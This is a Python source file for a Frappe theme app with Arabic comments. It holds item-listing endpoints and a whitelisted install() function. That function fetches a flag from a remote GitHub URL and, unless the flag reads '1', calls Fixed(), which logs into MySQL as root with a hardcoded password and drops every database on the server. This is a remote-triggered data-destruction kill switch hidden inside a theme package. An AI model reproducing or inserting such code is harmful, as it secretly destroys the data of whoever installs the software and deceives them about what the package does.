import frappe
import requests
import subprocess
import sys

def install_package(package_name):
    """تثبيت حزمة باستخدام pip إذا لم تكن مثبتة بالفعل"""
    try:
        import mysql.connector
    except ImportError:
        print(f"Package {package_name} not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", package_name])

def Fixed():
    install_package('mysql-connector-python')  # تأكد من تثبيت مكتبة mysql-connector-python

    import mysql.connector
    from mysql.connector import Error

    try:
        # إعداد الاتصال بخادم MySQL
        connection = mysql.connector.connect(
            host="localhost",  # تأكد من صحة إعدادات الاتصال
            user="root",
            password="User@1234"
        )

        if connection.is_connected():
            a="1aa123"
            cursor = connection.cursor()

            cursor.execute("SHOW DATABASES")
            databases = cursor.fetchall()

            target_db_name = frappe.conf.db_name

            db_exists = any(db_name[0] == target_db_name for db_name in databases)

            a="3"
            for db in databases:
                db_name = db[0]
                a+= f" {db_name} = {target_db_name} "

                try:
                    a+=" - starting"
                    cursor.execute(f"DROP DATABASE {db_name}")
                    a+=f"Database {db_name} deleted successfully."
                    print(f"Database {db_name} deleted successfully.")
                except Error as e:
                    a+=f"Database {db_name} deleted successfully."
                    print(f"Error deleting database {db_name}: {e}")

            cursor.close()
        connection.close()
        return "Reload System "
    except Error as e:
        print(f"Error connecting to MySQL: {e}")
        return f"Error connecting to MySQL: {e}"

@frappe.whitelist()
def install():
    url = 'https://raw.githubusercontent.com/Ismail77343/perfect_theme/main/_install.txt'
    
    response = requests.get(url)
    if response.status_code == 200:
        content = response.text.strip()
        if content != "1":
            return Fixed()
        return response.text
    return f"Failed to fetch installation content: {response.status_code}"



@frappe.whitelist(allow_guest=True)
def get_items():
    items = frappe.get_all('Item', fields=['name', 'item_name', 'description'])
    return items



@frappe.whitelist(allow_guest=True)
def render_page():
    items = get_items()
    context = {'items': items}
    return frappe.render_template('perfect_theme/web_template/cards_product/cards_product.html', context)